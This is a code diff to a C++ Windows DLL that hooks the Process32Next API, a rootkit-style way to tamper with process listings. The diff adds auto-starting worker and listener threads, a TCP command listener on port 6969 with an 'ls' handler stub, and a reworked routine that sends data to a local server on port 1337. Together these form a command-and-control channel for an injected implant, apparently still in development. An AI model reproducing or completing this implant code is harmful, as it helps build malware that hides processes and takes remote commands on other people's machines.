@@ -10,21 +10,104 @@
 // For networking
 #include <WinSock2.h>
 #include <ws2tcpip.h>
+#include <functional>
+#include <thread>
+#include <optional>
+#include <queue>
+#include <mutex>
 
 #pragma comment(lib, "Ws2_32.lib")
 
 // Define some stuff :)
-#define SERVER_PORT "1337"
+#define SEND_PORT "1337"
 #define BUFFER_LEN 1024
+#define LISTEN_PORT "6969"
 
 // TYPEDEFS ARE MAGIC :)
 // tfw missing the WINAPI declaration causes hours of debugging due to bad stack pointers
 typedef BOOL(WINAPI *fnPtr)(HANDLE, LPPROCESSENTRY32);
 
+// stub function declarations
+int ListenServer(void);
+
 // https://stackoverflow.com/questions/16473782/getprocaddress-and-function-pointers-is-this-correct
 fnPtr OriginalProcess32Next;
+char cur_dir[BUFFER_LEN];
 
-int PollServer() {
+// COPIED FROM https://stackoverflow.com/a/16075550/3492895
+// Thread to do arbitrary work using a queue
+template <class T>
+class SafeQueue
+{
+public:
+	SafeQueue(void)
+		: q()
+		, m()
+		, c()
+	{}
+
+	~SafeQueue(void)
+	{}
+
+	// Add an element to the queue.
+	void enqueue(T t)
+	{
+		std::lock_guard<std::mutex> lock(m);
+		q.push(t);
+		c.notify_one();
+	}
+
+	// Get the "front"-element.
+	// If the queue is empty, wait till a element is avaiable.
+	T dequeue(void)
+	{
+		std::unique_lock<std::mutex> lock(m);
+		while (q.empty())
+		{
+			// release lock as long as the wait and reaquire it afterwards.
+			c.wait(lock);
+		}
+		T val = q.front();
+		q.pop();
+		return val;
+	}
+
+	int size(void)
+	{
+		return q.size();
+	}
+
+private:
+	std::queue<T> q;
+	mutable std::mutex m;
+	std::condition_variable c;
+};
+
+static SafeQueue<std::optional<std::function<void()>>> work_queue;
+
+// Thread that does work - dequeues
+static std::thread worker([]() {
+	std::cout << "[DLL] WORKER THREAD STARTED" << std::endl;
+	while (true) {
+		std::optional<std::function<void()>> work = work_queue.dequeue();
+		if (work) {
+			(*work)();
+		}
+		else {
+			break;
+		}
+	}
+});
+
+// Thread that listens to server input and allocates work to queue
+static std::thread listener([]() {
+	std::cout << "[DLL] LISTENER THREAD STARTED" << std::endl;
+	while (true) {
+		ListenServer();
+	}
+});
+
+int ListenServer(void) {
 	// https://docs.microsoft.com/en-us/windows/win32/winsock/initializing-winsock
 	WSADATA wsaData;
 
@@ -41,7 +124,7 @@ int PollServer() {
 		hints.ai_socktype = SOCK_STREAM;
 		hints.ai_protocol = IPPROTO_TCP;
 
-		iResult = getaddrinfo("127.0.0.1", SERVER_PORT, &hints, &result);
+		iResult = getaddrinfo("127.0.0.1", LISTEN_PORT, &hints, &result);
 		if (iResult) {
 			WSACleanup();
 			return 1;
@@ -62,10 +145,89 @@ int PollServer() {
 		}
 		else {
 			int recvbuflen = BUFFER_LEN;
-
-			const char* sendbuf = "this is a test";
 			char recvbuf[BUFFER_LEN];
 
+			int iResult;
+
+			// shutdown the connection for sending since no more data will be sent
+			// the client can still use the ConnectSocket for receiving data
+			iResult = shutdown(ConnSock, SD_SEND);
+			if (iResult == SOCKET_ERROR) {
+				printf("[DLL] [LISTENER] Shutdown Failed: %d\n", WSAGetLastError());
+				closesocket(ConnSock);
+				WSACleanup();
+				return 1;
+			}
+
+			do {
+				iResult = recv(ConnSock, recvbuf, recvbuflen, 0);
+				if (iResult > 0) {
+					printf("[DLL] [LISTENER] Bytes received: %d\n", iResult);
+					printf("[DLL] [LISTENER] Recieved: %.*s\n", iResult, recvbuf);
+					if (!strncmp(recvbuf, "ls", 2)) {
+
+					}
+				}
+				else if (iResult == 0) {
+					printf("[DLL] [LISTENER] Connection closed\n");
+				}
+				else {
+					printf("[DLL] [LISTENER] recv failed: %d\n", WSAGetLastError());
+				}
+			} while (iResult > 0);
+
+			closesocket(ConnSock);
+			WSACleanup();
+			return 0;
+		}
+
+		freeaddrinfo(result);
+
+		if (ConnSock == INVALID_SOCKET) {
+			WSACleanup();
+			return 1;
+		}
+	}
+	return 1;
+}
+
+int PollServer(const char* sendbuf, char* src_addr, int src_addrlen) {
+	// https://docs.microsoft.com/en-us/windows/win32/winsock/initializing-winsock
+	WSADATA wsaData;
+
+	int iResult;
+
+	// Initialize Winsock
+	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	if (!iResult) {
+		// Start making packet
+		struct addrinfo* result = NULL, * ptr = NULL, hints;
+
+		ZeroMemory(&hints, sizeof(hints));
+		hints.ai_family = AF_UNSPEC;
+		hints.ai_socktype = SOCK_STREAM;
+		hints.ai_protocol = IPPROTO_TCP;
+
+		iResult = getaddrinfo("127.0.0.1", SEND_PORT, &hints, &result);
+		if (iResult) {
+			WSACleanup();
+			return 1;
+		}
+		// https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-socket-for-the-client
+		SOCKET ConnSock = INVALID_SOCKET;
+		ptr = result;
+		ConnSock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+		if (ConnSock == INVALID_SOCKET) {
+			freeaddrinfo(result);
+			WSACleanup();
+			return 1;
+		}
+		iResult = connect(ConnSock, ptr->ai_addr, (int)ptr->ai_addrlen);
+		if (iResult == SOCKET_ERROR) {
+			closesocket(ConnSock);
+			ConnSock = INVALID_SOCKET;
+		}
+		else {
 			int iResult;
 
 			// Send an initial buffer
@@ -79,7 +241,6 @@ int PollServer() {
 			printf("Bytes Sent: %ld\n", iResult);
 
 			// shutdown the connection for sending since no more data will be sent
-			// the client can still use the ConnectSocket for receiving data
 			iResult = shutdown(ConnSock, SD_SEND);
 			if (iResult == SOCKET_ERROR) {
 				printf("shutdown failed: %d\n", WSAGetLastError());
@@ -87,17 +248,6 @@ int PollServer() {
 				WSACleanup();
 				return 1;
 			}
-
-			// Receive data until the server closes the connection
-			/*do {
-				iResult = recv(ConnSock, recvbuf, recvbuflen, 0);
-				if (iResult > 0)
-					printf("Bytes received: %d\n", iResult);
-				else if (iResult == 0)
-					printf("Connection closed\n");
-				else
-					printf("recv failed: %d\n", WSAGetLastError());
-			} while (iResult > 0);*/
 
 			closesocket(ConnSock);
 			WSACleanup();
@@ -135,9 +285,6 @@ BOOL WINAPI HookedProcess32Next(
 		}
 	}
 	std::cout << "[DLL] [REPLACEMENT FUNC] Done with emulating original function" << std::endl;
-	std::cout << "[DLL] [REPLACEMENT FUNC] Contacting server..." << std::endl;
-
-	PollServer();
 	std::cout << "[DLL] [REPLACEMENT FUNC] Returning to caller" << std::endl;
 	return success;
 }
